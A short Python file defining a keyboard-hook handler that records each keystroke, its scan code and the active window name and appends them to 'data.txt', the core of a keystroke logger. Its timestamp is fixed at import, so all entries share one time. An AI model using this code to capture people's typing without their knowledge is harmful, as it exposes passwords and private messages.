from __future__ import print_function

import datetime
instanTime=datetime.datetime.now()
from Logger import Logs

def OnKeyboardEvent(self):
    self.time_details = "{}.{}.{} - {}:{}:{} ".format(instanTime.day, instanTime.month, instanTime.year,
                                                                    instanTime.hour, instanTime.minute,
                                                                    instanTime.second)
    self.keyboardData = {
        "MessageName": self.MessageName,
        "MouseMessage": self.Message,
        "DetailTime": self.time_details,
        "Window": self.Window,
        "WindowName": self.WindowName,
        "Ascıı":self.Ascii,
        "Key": self.Key,
        "ScanCode":self.ScanCode,
        "Extended":self.Extended,
        "ınjected": self.Injected,
        "Alt":self.Alt,
        "Transition":self.Transition

    }
    Logs.Registre("data.txt", self.keyboardData)

    return True
